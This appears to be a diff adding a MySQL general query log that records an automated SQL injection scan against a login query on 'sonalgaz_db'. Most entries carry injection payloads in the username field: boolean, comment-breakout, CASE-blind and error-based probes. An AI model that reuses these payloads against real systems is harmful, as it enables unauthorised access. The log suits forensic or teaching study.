@@ -1,0 +1,484 @@
+/usr/sbin/mysqld, Version: 9.2.0 (MySQL Community Server - GPL). started with:
+Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
+Time                 Id Command    Argument
+2025-04-11T01:51:27.730133Z	   13 Query	SET GLOBAL slow_query_log = 'ON'
+2025-04-11T01:51:27.732879Z	   13 Query	SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log'
+2025-04-11T02:03:41.727354Z	   14 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:41.728247Z	   14 Prepare	SELECT * FROM users WHERE username = 'test' AND password = 'test'
+2025-04-11T02:03:41.728387Z	   14 Execute	SELECT * FROM users WHERE username = 'test' AND password = 'test'
+2025-04-11T02:03:41.729021Z	   14 Close stmt	
+2025-04-11T02:03:41.729137Z	   14 Quit	
+2025-04-11T02:03:41.768808Z	   15 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:41.769189Z	   15 Prepare	SELECT * FROM users WHERE username = 'test' AND password = 'test'
+2025-04-11T02:03:41.769273Z	   15 Execute	SELECT * FROM users WHERE username = 'test' AND password = 'test'
+2025-04-11T02:03:41.769618Z	   15 Close stmt	
+2025-04-11T02:03:41.769665Z	   15 Quit	
+2025-04-11T02:03:42.225871Z	   16 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.227823Z	   16 Prepare	SELECT * FROM users WHERE username = 'test' AND password = 'test'
+2025-04-11T02:03:42.228108Z	   16 Execute	SELECT * FROM users WHERE username = 'test' AND password = 'test'
+2025-04-11T02:03:42.229404Z	   16 Close stmt	
+2025-04-11T02:03:42.229682Z	   16 Quit	
+2025-04-11T02:03:42.264429Z	   17 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.264878Z	   17 Prepare	SELECT * FROM users WHERE username = '8043' AND password = 'test'
+2025-04-11T02:03:42.264976Z	   17 Execute	SELECT * FROM users WHERE username = '8043' AND password = 'test'
+2025-04-11T02:03:42.265340Z	   17 Close stmt	
+2025-04-11T02:03:42.265375Z	   17 Quit	
+2025-04-11T02:03:42.275946Z	   18 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.277013Z	   18 Quit	
+2025-04-11T02:03:42.291529Z	   19 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.292041Z	   19 Quit	
+2025-04-11T02:03:42.352041Z	   20 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.352621Z	   20 Quit	
+2025-04-11T02:03:42.367091Z	   21 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.367406Z	   21 Quit	
+2025-04-11T02:03:42.382924Z	   22 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.383377Z	   22 Prepare	SELECT * FROM users WHERE username = 'test' AND 7476=7364 AND 'sAMH'='sAMH' AND password = 'test'
+2025-04-11T02:03:42.383432Z	   22 Execute	SELECT * FROM users WHERE username = 'test' AND 7476=7364 AND 'sAMH'='sAMH' AND password = 'test'
+2025-04-11T02:03:42.383831Z	   22 Close stmt	
+2025-04-11T02:03:42.383867Z	   22 Quit	
+2025-04-11T02:03:42.392887Z	   23 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.393210Z	   23 Prepare	SELECT * FROM users WHERE username = 'test' AND 2827=2827 AND 'iAIc'='iAIc' AND password = 'test'
+2025-04-11T02:03:42.393248Z	   23 Execute	SELECT * FROM users WHERE username = 'test' AND 2827=2827 AND 'iAIc'='iAIc' AND password = 'test'
+2025-04-11T02:03:42.393459Z	   23 Close stmt	
+2025-04-11T02:03:42.393489Z	   23 Quit	
+2025-04-11T02:03:42.397425Z	   24 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.397755Z	   24 Prepare	SELECT * FROM users WHERE username = 'test) AND 4911=7938 AND (1626=1626' AND password = 'test'
+2025-04-11T02:03:42.397796Z	   24 Execute	SELECT * FROM users WHERE username = 'test) AND 4911=7938 AND (1626=1626' AND password = 'test'
+2025-04-11T02:03:42.398001Z	   24 Close stmt	
+2025-04-11T02:03:42.398022Z	   24 Quit	
+2025-04-11T02:03:42.401701Z	   25 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.401989Z	   25 Prepare	SELECT * FROM users WHERE username = 'test) AND 2827=2827 AND (2790=2790' AND password = 'test'
+2025-04-11T02:03:42.402031Z	   25 Execute	SELECT * FROM users WHERE username = 'test) AND 2827=2827 AND (2790=2790' AND password = 'test'
+2025-04-11T02:03:42.402247Z	   25 Close stmt	
+2025-04-11T02:03:42.402267Z	   25 Quit	
+2025-04-11T02:03:42.407586Z	   26 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.407939Z	   26 Prepare	SELECT * FROM users WHERE username = 'test AND 5396=2668' AND password = 'test'
+2025-04-11T02:03:42.407973Z	   26 Execute	SELECT * FROM users WHERE username = 'test AND 5396=2668' AND password = 'test'
+2025-04-11T02:03:42.408301Z	   26 Close stmt	
+2025-04-11T02:03:42.408324Z	   26 Quit	
+2025-04-11T02:03:42.411892Z	   27 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.412141Z	   27 Prepare	SELECT * FROM users WHERE username = 'test AND 2827=2827' AND password = 'test'
+2025-04-11T02:03:42.412172Z	   27 Execute	SELECT * FROM users WHERE username = 'test AND 2827=2827' AND password = 'test'
+2025-04-11T02:03:42.412408Z	   27 Close stmt	
+2025-04-11T02:03:42.412431Z	   27 Quit	
+2025-04-11T02:03:42.415664Z	   28 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.415923Z	   28 Prepare	SELECT * FROM users WHERE username = 'test AND 1608=8424-- yYAC' AND password = 'test'
+2025-04-11T02:03:42.415953Z	   28 Execute	SELECT * FROM users WHERE username = 'test AND 1608=8424-- yYAC' AND password = 'test'
+2025-04-11T02:03:42.416185Z	   28 Close stmt	
+2025-04-11T02:03:42.416283Z	   28 Quit	
+2025-04-11T02:03:42.419298Z	   29 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.419646Z	   29 Prepare	SELECT * FROM users WHERE username = 'test AND 2827=2827-- sIPg' AND password = 'test'
+2025-04-11T02:03:42.419707Z	   29 Execute	SELECT * FROM users WHERE username = 'test AND 2827=2827-- sIPg' AND password = 'test'
+2025-04-11T02:03:42.419932Z	   29 Close stmt	
+2025-04-11T02:03:42.419954Z	   29 Quit	
+2025-04-11T02:03:42.426231Z	   30 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.426485Z	   30 Prepare	SELECT * FROM users WHERE username = '(SELECT (CASE WHEN (9074=1866) THEN 0x74657374 ELSE (SELECT 1866 UNION SELECT 1099) END))' AND password = 'test'
+2025-04-11T02:03:42.426514Z	   30 Execute	SELECT * FROM users WHERE username = '(SELECT (CASE WHEN (9074=1866) THEN 0x74657374 ELSE (SELECT 1866 UNION SELECT 1099) END))' AND password = 'test'
+2025-04-11T02:03:42.426752Z	   30 Close stmt	
+2025-04-11T02:03:42.426779Z	   30 Quit	
+2025-04-11T02:03:42.429848Z	   31 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.430080Z	   31 Prepare	SELECT * FROM users WHERE username = '(SELECT (CASE WHEN (5345=5345) THEN 0x74657374 ELSE (SELECT 2560 UNION SELECT 6075) END))' AND password = 'test'
+2025-04-11T02:03:42.430109Z	   31 Execute	SELECT * FROM users WHERE username = '(SELECT (CASE WHEN (5345=5345) THEN 0x74657374 ELSE (SELECT 2560 UNION SELECT 6075) END))' AND password = 'test'
+2025-04-11T02:03:42.430306Z	   31 Close stmt	
+2025-04-11T02:03:42.430330Z	   31 Quit	
+2025-04-11T02:03:42.434472Z	   32 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.434780Z	   32 Prepare	SELECT * FROM users WHERE username = '(SELECT CONCAT(CONCAT(0x716b6b6b71,(CASE WHEN (7243=7243) THEN 0x31 ELSE 0x30 END)),0x7176786271))' AND password = 'test'
+2025-04-11T02:03:42.434827Z	   32 Execute	SELECT * FROM users WHERE username = '(SELECT CONCAT(CONCAT(0x716b6b6b71,(CASE WHEN (7243=7243) THEN 0x31 ELSE 0x30 END)),0x7176786271))' AND password = 'test'
+2025-04-11T02:03:42.435045Z	   32 Close stmt	
+2025-04-11T02:03:42.435067Z	   32 Quit	
+2025-04-11T02:03:42.440299Z	   33 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.441029Z	   33 Quit	
+2025-04-11T02:03:42.446996Z	   34 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.447351Z	   34 Quit	
+2025-04-11T02:03:42.451454Z	   35 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.451771Z	   35 Prepare	SELECT * FROM users WHERE username = 'test' AND 3817=6863#' AND password = 'test'
+2025-04-11T02:03:42.451811Z	   35 Execute	SELECT * FROM users WHERE username = 'test' AND 3817=6863#' AND password = 'test'
+2025-04-11T02:03:42.451979Z	   35 Close stmt	
+2025-04-11T02:03:42.452015Z	   35 Quit	
+2025-04-11T02:03:42.456282Z	   36 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.456771Z	   36 Prepare	SELECT * FROM users WHERE username = 'test' AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.456939Z	   36 Execute	SELECT * FROM users WHERE username = 'test' AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.457355Z	   36 Close stmt	
+2025-04-11T02:03:42.457398Z	   36 Quit	
+2025-04-11T02:03:42.461297Z	   37 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.461643Z	   37 Prepare	SELECT * FROM users WHERE username = 'test" AND 8748=9751#' AND password = 'test'
+2025-04-11T02:03:42.461683Z	   37 Execute	SELECT * FROM users WHERE username = 'test" AND 8748=9751#' AND password = 'test'
+2025-04-11T02:03:42.461979Z	   37 Close stmt	
+2025-04-11T02:03:42.462007Z	   37 Quit	
+2025-04-11T02:03:42.465346Z	   38 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.465611Z	   38 Prepare	SELECT * FROM users WHERE username = 'test" AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.465646Z	   38 Execute	SELECT * FROM users WHERE username = 'test" AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.465916Z	   38 Close stmt	
+2025-04-11T02:03:42.465957Z	   38 Quit	
+2025-04-11T02:03:42.469326Z	   39 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.469751Z	   39 Quit	
+2025-04-11T02:03:42.476333Z	   40 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.476671Z	   40 Quit	
+2025-04-11T02:03:42.481064Z	   41 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.481422Z	   41 Quit	
+2025-04-11T02:03:42.485453Z	   42 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.485859Z	   42 Quit	
+2025-04-11T02:03:42.492673Z	   43 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.492938Z	   43 Prepare	SELECT * FROM users WHERE username = 'test%' AND 7340=9308#' AND password = 'test'
+2025-04-11T02:03:42.492975Z	   43 Execute	SELECT * FROM users WHERE username = 'test%' AND 7340=9308#' AND password = 'test'
+2025-04-11T02:03:42.493142Z	   43 Close stmt	
+2025-04-11T02:03:42.493162Z	   43 Quit	
+2025-04-11T02:03:42.496424Z	   44 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.496684Z	   44 Prepare	SELECT * FROM users WHERE username = 'test%' AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.496724Z	   44 Execute	SELECT * FROM users WHERE username = 'test%' AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.496930Z	   44 Close stmt	
+2025-04-11T02:03:42.496950Z	   44 Quit	
+2025-04-11T02:03:42.500258Z	   45 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.500473Z	   45 Prepare	SELECT * FROM users WHERE username = 'test") AND 1287=7992#' AND password = 'test'
+2025-04-11T02:03:42.500501Z	   45 Execute	SELECT * FROM users WHERE username = 'test") AND 1287=7992#' AND password = 'test'
+2025-04-11T02:03:42.500703Z	   45 Close stmt	
+2025-04-11T02:03:42.500727Z	   45 Quit	
+2025-04-11T02:03:42.504795Z	   46 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.505211Z	   46 Prepare	SELECT * FROM users WHERE username = 'test") AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.505260Z	   46 Execute	SELECT * FROM users WHERE username = 'test") AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.505689Z	   46 Close stmt	
+2025-04-11T02:03:42.505721Z	   46 Quit	
+2025-04-11T02:03:42.509590Z	   47 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.509848Z	   47 Prepare	SELECT * FROM users WHERE username = 'test")) AND 7926=5433#' AND password = 'test'
+2025-04-11T02:03:42.509885Z	   47 Execute	SELECT * FROM users WHERE username = 'test")) AND 7926=5433#' AND password = 'test'
+2025-04-11T02:03:42.510093Z	   47 Close stmt	
+2025-04-11T02:03:42.510115Z	   47 Quit	
+2025-04-11T02:03:42.513457Z	   48 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.513713Z	   48 Prepare	SELECT * FROM users WHERE username = 'test")) AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.513744Z	   48 Execute	SELECT * FROM users WHERE username = 'test")) AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.514011Z	   48 Close stmt	
+2025-04-11T02:03:42.514035Z	   48 Quit	
+2025-04-11T02:03:42.517139Z	   49 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.517389Z	   49 Prepare	SELECT * FROM users WHERE username = 'test"))) AND 5205=2320#' AND password = 'test'
+2025-04-11T02:03:42.517425Z	   49 Execute	SELECT * FROM users WHERE username = 'test"))) AND 5205=2320#' AND password = 'test'
+2025-04-11T02:03:42.517717Z	   49 Close stmt	
+2025-04-11T02:03:42.517749Z	   49 Quit	
+2025-04-11T02:03:42.522438Z	   50 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.523051Z	   50 Prepare	SELECT * FROM users WHERE username = 'test"))) AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.523185Z	   50 Execute	SELECT * FROM users WHERE username = 'test"))) AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.523735Z	   50 Close stmt	
+2025-04-11T02:03:42.523768Z	   50 Quit	
+2025-04-11T02:03:42.527734Z	   51 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.528094Z	   51 Quit	
+2025-04-11T02:03:42.533188Z	   52 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.533526Z	   52 Quit	
+2025-04-11T02:03:42.540258Z	   53 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.540607Z	   53 Prepare	SELECT * FROM users WHERE username = 'test")) AS XaKD WHERE 2584=2584 AND 9047=2845#' AND password = 'test'
+2025-04-11T02:03:42.540695Z	   53 Execute	SELECT * FROM users WHERE username = 'test")) AS XaKD WHERE 2584=2584 AND 9047=2845#' AND password = 'test'
+2025-04-11T02:03:42.540964Z	   53 Close stmt	
+2025-04-11T02:03:42.540986Z	   53 Quit	
+2025-04-11T02:03:42.544620Z	   54 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.544871Z	   54 Prepare	SELECT * FROM users WHERE username = 'test")) AS thbX WHERE 9967=9967 AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.544908Z	   54 Execute	SELECT * FROM users WHERE username = 'test")) AS thbX WHERE 9967=9967 AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.545112Z	   54 Close stmt	
+2025-04-11T02:03:42.545133Z	   54 Quit	
+2025-04-11T02:03:42.548523Z	   55 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.548860Z	   55 Quit	
+2025-04-11T02:03:42.553270Z	   56 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.553677Z	   56 Quit	
+2025-04-11T02:03:42.560401Z	   57 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.560667Z	   57 Prepare	SELECT * FROM users WHERE username = 'test") AS acXb WHERE 7311=7311 AND 1280=4632#' AND password = 'test'
+2025-04-11T02:03:42.560707Z	   57 Execute	SELECT * FROM users WHERE username = 'test") AS acXb WHERE 7311=7311 AND 1280=4632#' AND password = 'test'
+2025-04-11T02:03:42.560945Z	   57 Close stmt	
+2025-04-11T02:03:42.560969Z	   57 Quit	
+2025-04-11T02:03:42.563949Z	   58 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.564198Z	   58 Prepare	SELECT * FROM users WHERE username = 'test") AS xbOw WHERE 4494=4494 AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.564227Z	   58 Execute	SELECT * FROM users WHERE username = 'test") AS xbOw WHERE 4494=4494 AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.564433Z	   58 Close stmt	
+2025-04-11T02:03:42.564470Z	   58 Quit	
+2025-04-11T02:03:42.567585Z	   59 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.567924Z	   59 Quit	
+2025-04-11T02:03:42.574037Z	   60 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.574345Z	   60 Quit	
+2025-04-11T02:03:42.578788Z	   61 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.579057Z	   61 Prepare	SELECT * FROM users WHERE username = 'test) AND 2452=5805#' AND password = 'test'
+2025-04-11T02:03:42.579096Z	   61 Execute	SELECT * FROM users WHERE username = 'test) AND 2452=5805#' AND password = 'test'
+2025-04-11T02:03:42.579402Z	   61 Close stmt	
+2025-04-11T02:03:42.579425Z	   61 Quit	
+2025-04-11T02:03:42.582664Z	   62 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.582973Z	   62 Prepare	SELECT * FROM users WHERE username = 'test) AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.583059Z	   62 Execute	SELECT * FROM users WHERE username = 'test) AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.583288Z	   62 Close stmt	
+2025-04-11T02:03:42.583306Z	   62 Quit	
+2025-04-11T02:03:42.586393Z	   63 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.586686Z	   63 Prepare	SELECT * FROM users WHERE username = 'test)) AND 7358=9924#' AND password = 'test'
+2025-04-11T02:03:42.586735Z	   63 Execute	SELECT * FROM users WHERE username = 'test)) AND 7358=9924#' AND password = 'test'
+2025-04-11T02:03:42.587185Z	   63 Close stmt	
+2025-04-11T02:03:42.587222Z	   63 Quit	
+2025-04-11T02:03:42.591376Z	   64 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.591627Z	   64 Prepare	SELECT * FROM users WHERE username = 'test)) AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.591661Z	   64 Execute	SELECT * FROM users WHERE username = 'test)) AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.591878Z	   64 Close stmt	
+2025-04-11T02:03:42.591898Z	   64 Quit	
+2025-04-11T02:03:42.595141Z	   65 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.595359Z	   65 Prepare	SELECT * FROM users WHERE username = 'test))) AND 5917=9734#' AND password = 'test'
+2025-04-11T02:03:42.595389Z	   65 Execute	SELECT * FROM users WHERE username = 'test))) AND 5917=9734#' AND password = 'test'
+2025-04-11T02:03:42.595570Z	   65 Close stmt	
+2025-04-11T02:03:42.595614Z	   65 Quit	
+2025-04-11T02:03:42.598983Z	   66 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.599226Z	   66 Prepare	SELECT * FROM users WHERE username = 'test))) AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.599253Z	   66 Execute	SELECT * FROM users WHERE username = 'test))) AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.599483Z	   66 Close stmt	
+2025-04-11T02:03:42.599504Z	   66 Quit	
+2025-04-11T02:03:42.603208Z	   67 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.603481Z	   67 Prepare	SELECT * FROM users WHERE username = 'test AND 1736=5278#' AND password = 'test'
+2025-04-11T02:03:42.603522Z	   67 Execute	SELECT * FROM users WHERE username = 'test AND 1736=5278#' AND password = 'test'
+2025-04-11T02:03:42.603985Z	   67 Close stmt	
+2025-04-11T02:03:42.604022Z	   67 Quit	
+2025-04-11T02:03:42.608810Z	   68 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.609051Z	   68 Prepare	SELECT * FROM users WHERE username = 'test AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.609083Z	   68 Execute	SELECT * FROM users WHERE username = 'test AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.609331Z	   68 Close stmt	
+2025-04-11T02:03:42.609356Z	   68 Quit	
+2025-04-11T02:03:42.612989Z	   69 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.613262Z	   69 Prepare	SELECT * FROM users WHERE username = 'test)) AS tmWZ WHERE 4492=4492 AND 5938=5620#' AND password = 'test'
+2025-04-11T02:03:42.613334Z	   69 Execute	SELECT * FROM users WHERE username = 'test)) AS tmWZ WHERE 4492=4492 AND 5938=5620#' AND password = 'test'
+2025-04-11T02:03:42.613587Z	   69 Close stmt	
+2025-04-11T02:03:42.613615Z	   69 Quit	
+2025-04-11T02:03:42.617014Z	   70 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.617264Z	   70 Prepare	SELECT * FROM users WHERE username = 'test)) AS HnKB WHERE 6073=6073 AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.617300Z	   70 Execute	SELECT * FROM users WHERE username = 'test)) AS HnKB WHERE 6073=6073 AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.617523Z	   70 Close stmt	
+2025-04-11T02:03:42.617556Z	   70 Quit	
+2025-04-11T02:03:42.620946Z	   71 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.621383Z	   71 Prepare	SELECT * FROM users WHERE username = 'test) AS tHIp WHERE 1472=1472 AND 6553=9391#' AND password = 'test'
+2025-04-11T02:03:42.621438Z	   71 Execute	SELECT * FROM users WHERE username = 'test) AS tHIp WHERE 1472=1472 AND 6553=9391#' AND password = 'test'
+2025-04-11T02:03:42.621907Z	   71 Close stmt	
+2025-04-11T02:03:42.621943Z	   71 Quit	
+2025-04-11T02:03:42.625895Z	   72 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.626148Z	   72 Prepare	SELECT * FROM users WHERE username = 'test) AS PtMy WHERE 1723=1723 AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.626194Z	   72 Execute	SELECT * FROM users WHERE username = 'test) AS PtMy WHERE 1723=1723 AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.626383Z	   72 Close stmt	
+2025-04-11T02:03:42.626418Z	   72 Quit	
+2025-04-11T02:03:42.629370Z	   73 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.629594Z	   73 Prepare	SELECT * FROM users WHERE username = 'test` WHERE 5200=5200 AND 7888=7346#' AND password = 'test'
+2025-04-11T02:03:42.629639Z	   73 Execute	SELECT * FROM users WHERE username = 'test` WHERE 5200=5200 AND 7888=7346#' AND password = 'test'
+2025-04-11T02:03:42.629835Z	   73 Close stmt	
+2025-04-11T02:03:42.629871Z	   73 Quit	
+2025-04-11T02:03:42.632803Z	   74 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.633065Z	   74 Prepare	SELECT * FROM users WHERE username = 'test` WHERE 7772=7772 AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.633101Z	   74 Execute	SELECT * FROM users WHERE username = 'test` WHERE 7772=7772 AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.633346Z	   74 Close stmt	
+2025-04-11T02:03:42.633366Z	   74 Quit	
+2025-04-11T02:03:42.637098Z	   75 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.637418Z	   75 Prepare	SELECT * FROM users WHERE username = 'test`) WHERE 1056=1056 AND 3929=3039#' AND password = 'test'
+2025-04-11T02:03:42.637503Z	   75 Execute	SELECT * FROM users WHERE username = 'test`) WHERE 1056=1056 AND 3929=3039#' AND password = 'test'
+2025-04-11T02:03:42.637990Z	   75 Close stmt	
+2025-04-11T02:03:42.638038Z	   75 Quit	
+2025-04-11T02:03:42.642356Z	   76 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.642619Z	   76 Prepare	SELECT * FROM users WHERE username = 'test`) WHERE 5310=5310 AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.642660Z	   76 Execute	SELECT * FROM users WHERE username = 'test`) WHERE 5310=5310 AND 8242=8242#' AND password = 'test'
+2025-04-11T02:03:42.642866Z	   76 Close stmt	
+2025-04-11T02:03:42.642885Z	   76 Quit	
+2025-04-11T02:03:42.646824Z	   77 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.647081Z	   77 Prepare	SELECT * FROM users WHERE username = '-9823' AND password = 'test'
+2025-04-11T02:03:42.647119Z	   77 Execute	SELECT * FROM users WHERE username = '-9823' AND password = 'test'
+2025-04-11T02:03:42.647322Z	   77 Close stmt	
+2025-04-11T02:03:42.647342Z	   77 Quit	
+2025-04-11T02:03:42.651371Z	   78 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.651777Z	   78 Quit	
+2025-04-11T02:03:42.658248Z	   79 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.658545Z	   79 Quit	
+2025-04-11T02:03:42.663148Z	   80 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.663375Z	   80 Prepare	SELECT * FROM users WHERE username = '-8716' OR 9437=8246#' AND password = 'test'
+2025-04-11T02:03:42.663403Z	   80 Execute	SELECT * FROM users WHERE username = '-8716' OR 9437=8246#' AND password = 'test'
+2025-04-11T02:03:42.663585Z	   80 Close stmt	
+2025-04-11T02:03:42.663640Z	   80 Quit	
+2025-04-11T02:03:42.666533Z	   81 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.666797Z	   81 Prepare	SELECT * FROM users WHERE username = '-3539' OR 5893=5893#' AND password = 'test'
+2025-04-11T02:03:42.666847Z	   81 Execute	SELECT * FROM users WHERE username = '-3539' OR 5893=5893#' AND password = 'test'
+2025-04-11T02:03:42.667079Z	   81 Close stmt	
+2025-04-11T02:03:42.667099Z	   81 Quit	
+2025-04-11T02:03:42.682479Z	   82 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.682747Z	   82 Prepare	SELECT * FROM users WHERE username = '-4485' OR 3248=8472#' AND password = 'test'
+2025-04-11T02:03:42.682787Z	   82 Execute	SELECT * FROM users WHERE username = '-4485' OR 3248=8472#' AND password = 'test'
+2025-04-11T02:03:42.682984Z	   82 Close stmt	
+2025-04-11T02:03:42.683020Z	   82 Quit	
+2025-04-11T02:03:42.686271Z	   83 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.686749Z	   83 Quit	
+2025-04-11T02:03:42.693794Z	   84 Connect	root@192.168.203.5 on sonalgaz_db using TCP/IP
+2025-04-11T02:03:42.702508Z	   84 Prepare	SELECT * FROM users WHERE username = 'test' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b6b6b71,(SELECT (ELT(7768=7768,1))),0x7176786271,0x78))s), 8446744073709551610, 8446744073709551610)))-- bHVN' AND password = 'test'
+2025-04-11T02:03:42.702564Z	   84 Execute	SELECT * FROM users WHERE username = 'test' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b6b6b71,(SELECT (ELT(7768=7768,1))),0x7176786271,0x78))s), 8446744073709551610, 8446744073709551610)))-- bHVN' AND password = 'test'
+2025-04-11T02:03:42.702907Z	   84 Close stmt	
+2025-04-11T02:03:42.702947Z	   84 Quit	
